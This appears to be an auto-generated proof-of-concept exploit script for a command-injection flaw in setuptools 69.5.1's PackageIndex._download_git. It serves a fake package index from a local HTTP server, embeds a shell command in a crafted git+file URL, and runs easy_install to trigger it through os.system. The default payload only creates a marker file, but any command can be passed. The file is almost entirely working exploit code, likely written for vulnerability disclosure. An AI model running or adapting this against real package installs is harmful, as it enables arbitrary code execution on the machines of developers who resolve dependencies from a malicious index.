#!/usr/bin/env python3
# PoC for setuptools-69.5.1 (/tmp/bounty_test/setuptools-69.5.1)
# Path: rce-015
# Sink: _download_git
# Auto-generated — run with: python3 rce_download_git_function_packageindex__download_git.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for setuptools-69.5.1 RCE via command injection
in PackageIndex._download_git().

Vulnerability: The _download_git function uses os.system() with an
attacker-controlled URL without sanitization. An attacker can inject
shell commands via a crafted git:// URL.

Affected: setuptools-69.5.1 (and likely earlier versions)
CVE: Not yet assigned

Usage:
    python3 poc.py [--target http://localhost:8080/simple/] [--payload "touch /tmp/poc_success.txt"]

The script creates a malicious package index entry that triggers the
vulnerability when easy_install resolves dependencies.
"""

import argparse
import os
import sys
import tempfile
import shutil
import subprocess
import urllib.request
import urllib.parse
import http.server
import threading
import time
import json

# Default benign payload - creates a marker file to prove RCE
DEFAULT_PAYLOAD = "touch /tmp/poc_success.txt"

# The malicious package name and version
MALICIOUS_PKG = "poc-exploit-12345"
MALICIOUS_VERSION = "1.0.0"

def create_malicious_index_html(payload, host, port):
    """
    Create an HTML page that looks like a PyPI simple index entry.
    The download URL contains the command injection payload.
    """
    # The injection happens in the git:// URL scheme handler
    # We use a git+file:// URL to avoid network requirements
    # The payload is injected after the git URL
    injected_url = f"git+file:///dev/null;{payload};#egg={MALICIOUS_PKG}-{MALICIOUS_VERSION}"
    
    html = f"""<!DOCTYPE html>
<html>
  <head>
    <title>Links for {MALICIOUS_PKG}</title>
  </head>
  <body>
    <h1>Links for {MALICIOUS_PKG}</h1>
    <a href="{injected_url}">{MALICIOUS_PKG}-{MALICIOUS_VERSION}.tar.gz</a><br/>
  </body>
</html>"""
    return html

class MaliciousIndexHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that serves the malicious package index."""
    
    def do_GET(self):
        if self.path == f"/simple/{MALICIOUS_PKG}/":
            html = create_malicious_index_html(
                self.server.payload,
                self.server.server_address[0],
                self.server.server_address[1]
            )
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

def start_malicious_server(payload, port=0):
    """Start a local HTTP server serving the malicious index."""
    server = http.server.HTTPServer(("127.0.0.1", port), MaliciousIndexHandler)
    server.payload = payload
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

def run_exploit(target_url, payload):
    """
    Execute the exploit by running easy_install with the malicious package.
    
    The exploit works by:
    1. Starting a local HTTP server that serves a malicious package index
    2. Running easy_install with --index-url pointing to our server
    3. The package index entry contains a git:// URL with command injection
    4. When easy_install tries to download the package, it calls _download_git()
    5. _download_git() executes os.system() with the injected URL
    """
    
    print("[*] Starting malicious package index server...")
    server = start_malicious_server(payload)
    port = server.server_address[1]
    print(f"[*] Server running on http://127.0.0.1:{port}")
    
    # Create a temporary directory for easy_install to work in
    tmpdir = tempfile.mkdtemp(prefix="poc_exploit_")
    original_dir = os.getcwd()
    
    try:
        os.chdir(tmpdir)
        
        # Create a minimal setup.py that requires our malicious package
        setup_py = f"""
from setuptools import setup
setup(
    name="poc-legitimate",
    version="0.0.1",
    install_requires=["{MALICIOUS_PKG}"],
)
"""
        with open("setup.py", "w") as f:
            f.write(setup_py)
        
        # Run easy_install with our malicious index
        cmd = [
            sys.executable, "-m", "easy_install",
            "--index-url", f"http://127.0.0.1:{port}/simple",
            "."
        ]
        
        print(f"[*] Running: {' '.join(cmd)}")
        print("[*] This will trigger the command injection...")
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        print(f"[*] easy_install stdout:\n{result.stdout}")
        print(f"[*] easy_install stderr:\n{result.stderr}")
        
        # Check if the payload executed
        if payload.startswith("touch"):
            marker_file = "/tmp/poc_success.txt"
            if os.path.exists(marker_file):
                print(f"[+] SUCCESS! Marker file created: {marker_file}")
                print("[+] Command injection confirmed!")
                return True
            else:
                print("[-] Marker file not found. Exploit may have failed.")
                return False
        else:
            print("[*] Custom payload used. Check for execution manually.")
            return True
            
    except subprocess.TimeoutExpired:
        print("[-] easy_install timed out. The exploit may have hung.")
        return False
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        return False
    finally:
        os.chdir(original_dir)
        shutil.rmtree(tmpdir, ignore_errors=True)
        server.shutdown()

def main():
    parser = argparse.ArgumentParser(
        description="PoC for setuptools RCE via command injection in _download_git"
    )
    parser.add_argument(
        "--payload",
        default=DEFAULT_PAYLOAD,
        help=f"Command to execute (default: {DEFAULT_PAYLOAD})"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080/simple/",
        help="Target index URL (not used in this PoC, but kept for compatibility)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("setuptools-69.5.1 RCE Proof-of-Concept")
    print("=" * 60)
    print()
    print(f"[*] Payload: {args.payload}")
    print(f"[*] Target: {args.target}")
    print()
    
    # Verify we're using the vulnerable version
    try:
        import setuptools
        ver = setuptools.__version__
        print(f"[*] Found setuptools version: {ver}")
        if ver != "69.5.1":
            print(f"[!] Warning: Expected 69.5.1, found {ver}")
            print("[!] The exploit may not work with this version")
    except ImportError:
        print("[!] Warning: Could not determine setuptools version")
    
    print()
    success = run_exploit(args.target, args.payload)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
